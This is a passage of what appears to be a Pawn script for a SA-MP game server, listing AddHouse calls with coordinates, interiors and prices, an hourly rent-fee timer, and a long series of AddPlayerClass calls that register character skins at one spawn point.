	AddHouse(1838, 3118.894042, -1660.618652, 10.011071, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1839); //Casa pequeña ;)
	AddHouse(1839, 3222.537597, -1725.657348, 3.692997, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1840); //Casa pequeña ;)
	AddHouse(1840, 3206.953125, -1745.532714, 2.163512, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1841);//Casa mediana
	AddHouse(1841, 3077.785156, -1805.997436, 1.680972, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1842); //Casa pequeña ;)
	AddHouse(1842, 3095.416259, -1809.462768, 1.680972, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1843); //Casa pequeña ;)
	AddHouse(1843, 613.101684, 1549.901733, 5.000144, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1844); //Casa pequeña ;)
	AddHouse(1844, -1101.767578, -976.449890, 129.284408, 295.28, 1473.01, 1080.25, 125000, 115000, 15, 1845);//Casa mediana
	AddHouse(1845, -1101.882568, -998.528442, 129.284408, 295.28, 1473.01, 1080.25, 125000, 115000, 15, 1846);//Casa mediana
	AddHouse(1846, -1024.314819, -987.066894, 130.102844, 225.79, 1025.77, 1084.00, 350000, 340000, 7, 1847); //Mansion
	AddHouse(1847, -1015.107604, -1054.130371, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1848); //Casa pequeña ;)
	AddHouse(1848, -1039.774536, -1054.117675, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1849); //Casa pequeña ;)
	AddHouse(1849, -1064.476440, -1054.097900, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1850); //Casa pequeña ;)
	AddHouse(1850, -1089.166015, -1053.999023, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1851); //Casa pequeña ;)
	AddHouse(1851, -1113.914062, -1054.228637, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1852); //Casa pequeña ;)
	AddHouse(1852, -1138.547973, -1054.213745, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1853); //Casa pequeña ;)
	AddHouse(1853, -1163.281616, -1054.349731, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1854); //Casa pequeña ;)
	AddHouse(1854, -1186.586181, -1054.215087, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1855); //Casa pequeña ;)
	AddHouse(1855, -1184.025146, -921.119506, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1856); //Casa pequeña ;)
	AddHouse(1856, -1159.481079, -921.080627, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1857); //Casa pequeña ;)
	AddHouse(1857, -1135.068481, -920.967041, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1858); //Casa pequeña ;)
	AddHouse(1858, -1110.546752, -920.985107, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1859); //Casa pequeña ;)
	AddHouse(1859, -1086.057495, -921.030761, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1860); //Casa pequeña ;)
	AddHouse(1860, -1061.537963, -920.895874, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1861); //Casa pequeña ;)
	AddHouse(1861, -1037.086669, -920.908813, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1862); //Casa pequeña ;)
	AddHouse(1862, -1012.558105, -921.074829, 130.631515, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1863); //Casa pequeña ;)
	AddHouse(1863, -1971.038452, -1592.041992, 87.844116, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1864);//Casa mediana
	AddHouse(1864, -32.714336, -2490.704345, 36.648437, 295.28, 1473.01, 1080.25, 150000, 140000, 15, 1865);//Casa mediana
	AddHouse(1865, -13.495024, -2522.437255, 36.655464, 295.28, 1473.01, 1080.25, 150000, 140000, 15, 1866);//Casa mediana
	AddHouse(1866, -17.640424, -2503.350585, 37.449180, 235.30, 1190.04, 1080.25, 215000, 205000, 3, 1867);//Casa grande
	AddHouse(1867, -858.702026, 1767.476074, 109.650283, 235.30, 1190.04, 1080.25, 175000, 165000, 3, 1868);//Casa grande
	AddHouse(1868, -2175.377441, 2791.566894, 167.463104, 235.30, 1190.04, 1080.25, 175000, 165000, 3, 1869);//Casa grande
	AddHouse(1869, -2081.331542, 2789.305908, 167.897994, 235.30, 1190.04, 1080.25, 175000, 165000, 3, 1870);//Casa grande
	AddHouse(1870, -1988.080322, 2841.702392, 157.191070, 235.30, 1190.04, 1080.25, 175000, 165000, 3, 1871);//Casa grande
	AddHouse(1871, -689.190185, 3353.100830, 28.726148, 225.79, 1025.77, 1084.00, 450000, 440000, 7, 1872); //Mansion
	AddHouse(1872, -758.640808, 3362.062011, 28.726148, 225.79, 1025.77, 1084.00, 450000, 440000, 7, 1873); //Mansion
	AddHouse(1873, -752.351135, 3416.533447, 29.446146, 225.79, 1025.77, 1084.00, 450000, 440000, 7, 1874); //Mansion
	AddHouse(1874, -682.299316, 3407.612060, 29.446146, 225.79, 1025.77, 1084.00, 450000, 440000, 7, 1875); //Mansion
	AddHouse(1875, -1515.170776, -2303.498779, 2.617846, 225.79, 1025.77, 1084.00, 600000, 590000, 7, 1876); //Mansion
	AddHouse(1876, -777.136230, 505.763549, 1376.589965, 235.30, 1190.04, 1080.25, 185000, 175000, 3, 1877);//Casa grande
	AddHouse(1877, -396.482818, -425.751403, 16.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1878); //Casa pequeña ;)
	AddHouse(1878, -427.122192, -391.985839, 16.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1879); //Casa pequeña ;)
	AddHouse(1879, -2893.337402, 485.140472, 5.730312, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1880); //Mansion
	AddHouse(1880, -2893.409667, 442.568817, 5.730312, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1881); //Mansion
	AddHouse(1881, -1107.089721, -1667.917358, 76.386772, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1882);//Casa grande
	AddHouse(1882, 836.260803, -2492.831542, 13.799772, 225.79, 1025.77, 1084.00, 10000000, 9000000, 7, 1883); //Mansion
	AddHouse(1883, -2077.416748, 2267.720703, 18.655942, 225.79, 1025.77, 1084.00, 600000, 500000, 7, 1884); //Mansion
	AddHouse(1884, 675.420837, 1834.289916, 5.580732, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1885);//Casa mediana
	AddHouse(1885, 1676.724121, 95.320640, 32.513187, 295.28, 1473.01, 1080.25, 400000, 30000, 15, 1886);//Casa mediana
	AddHouse(1886, -2080.733154, 1422.376953, 7.312992, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1887);//Casa mediana
	AddHouse(1887, -938.909301, 1425.258056, 30.433994, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1888); //Casa pequeña ;)
	AddHouse(1888, -3371.038085, 2074.086425, 8.034399, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1889);//Casa mediana
	AddHouse(1889, -791.358764, 2422.917480, 157.942214, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1890); //Casa pequeña ;)

	//1441 Houses By BlackMamba!

	SetTimer("rentfee", 1*60*60*1000, 1);//1 hour
//-------------------------------- TODOS LOS SKINES --------------------------------
     AddPlayerClass(0,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(266,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(267,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(268,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(269,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(270,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(271,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(272,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(280,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(281,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(282,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(283,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(284,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(285,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(286,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(287,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(254,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(255,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(256,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(257,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(258,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(259,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(260,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(261,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(262,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(263,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(264,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(274,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(275,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(276,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(1,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(2,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(290,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(291,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(292,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(293,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(294,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(295,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(296,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(297,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(298,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
     AddPlayerClass(299,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(277,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(278,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(279,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(288,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(47,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(48,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(49,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(50,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(51,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(52,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(53,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(54,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(55,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(56,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(57,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(58,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(59,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(60,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(61,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(62,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(63,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(64,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(66,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(67,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(68,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(69,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(70,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(71,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(72,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(73,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(75,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(76,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(78,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(79,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(80,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(81,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(82,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(83,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(84,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(85,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(87,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(88,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(89,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(91,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(92,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(93,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(95,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(96,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(97,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(98,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(99,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(100,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(101,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(102,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(103,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(104,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(105,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(106,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(107,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(108,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(109,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(110,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(111,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(112,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(113,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(114,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(115,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(116,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(117,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(118,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(120,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(121,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(122,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(123,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(124,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(125,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(126,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(127,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(128,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(129,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(131,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(133,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(134,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(135,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(136,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(137,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(138,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(139,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(140,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(141,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(142,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(143,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(144,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(145,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(146,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(147,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(148,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(150,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(151,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(152,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(153,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(154,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(155,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(156,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(157,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(158,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(159,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(160,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(161,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(162,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(163,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(164,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(165,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(166,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(167,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(168,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(169,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(170,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(171,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(172,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(173,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(174,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(175,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(176,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(177,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(178,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(179,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(180,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(181,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(182,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(183,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(184,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(185,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(186,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(187,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(188,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(189,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(190,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(191,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(192,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(193,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(194,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(195,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(196,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(197,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(198,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(199,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(200,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(201,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(202,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(203,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(204,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(205,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(206,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(207,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(209,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(210,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(211,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(212,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(213,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(214,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(215,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(216,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(217,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(218,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(219,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(220,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(221,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(222,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(223,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(224,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(225,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(226,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(227,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(228,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(229,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(230,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(231,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(232,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(233,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(234,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(235,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(236,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(237,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(238,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(239,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(240,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(241,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(242,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(243,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(244,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
	 AddPlayerClass(245,-312.4522,1537.7388,75.5625,179.8149,0,0,0,0,0,0);
